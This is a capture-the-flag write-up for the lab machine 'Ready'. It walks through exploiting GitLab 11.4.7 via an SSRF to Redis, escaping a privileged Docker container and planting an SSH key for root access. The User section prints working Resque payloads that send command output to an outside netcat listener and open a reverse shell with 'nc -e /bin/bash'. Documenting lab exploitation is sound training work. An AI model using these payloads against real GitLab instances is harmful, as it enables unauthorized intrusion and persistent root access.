---
layout: default
title: Ready
permalink: /writeup/ready/
lang: en
---

<img src="./img/ready.png"  width="650"/>

Ready is a Linux machine. The ip of the box is 10.10.10.220.

# Recon

I starting with *nmap* scan `nmap -sC -Sv -oA nmap/ready 10.10.10.220`

<img src="./img/nmap.png"  width="650"/>


And I found two services:
- *ssh*
- *webserver nginx*(5080)

On port 5080 we got gitlab login page.

<img src="./img/home.png"  width="650"/>

I check for gitlab version and found that the running version is `11.4.7`. So i found this [article](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) that explain the vulnerabilities of this version and a exploit.


# User
So i created a new user on gitlab and checked if the instance was vulnerable.

Step:

- Created a new project from **repo by url** and added in **Git repository URL**  `git://[0:0:0:0:0:ffff:127.0.0.1]:6379/`

<img src="./img/testcvegit.png"  width="650"/>

- Intercepted with `burp` and added the following payload

```ruby
multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| whoami |nc 10.10.14.181 9090 \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
```
<img src="./img/testcve.png"  width="650"/>

The instance is vulnerable so create a new project and this time i added the following payload for the rev shell

```ruby
multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|nc 10.10.14.181 9090 -e /bin/bash \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
```
<img src="./img/revshell.png"  width="650"/>

Now i go on `dude` home and take the user flag.
<img src="./img/userflag.png"  width="650"/>

# Root
I found in `/opt/backup/` two interesting files `gitlab.rb` and `docker-compose.yml`.

In `gitlab.rb` there is a password.

<img src="./img/passwordok.png"  width="650"/>


and in the `docker-compose.yml` there is the configuration of running container.

<img src="./img/docker.png"  width="650"/>

The password found is for `root` user of container.

<img src="./img/rootshell.png"  width="650"/>


while in the `docker-compose` there is `privileged` setted that make the docker instance vulnerable. Major info on this are on this [page](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout).

So I mounted the filesystem on my new directory

<img src="./img/dockermount.png"  width="650"/>

So now i can navigate on entire filesystem and can take the root flag.

<img src="./img/rootflag.png"  width="650"/>

##Bouns - SSH
For full root priv can add the ssh key in the `root/.ssh`

- Generate the pair of key
 
<img src="./img/ssh1.png"  width="650"/>

- copy the `pub_key`  in  `/root/.ssh/authorized_keys` of the remote host

<img src="./img/ssh3.png"  width="650"/>

Now can access with ssh as `root`.


<img src="./img/readypwn.png"  width="650"/>
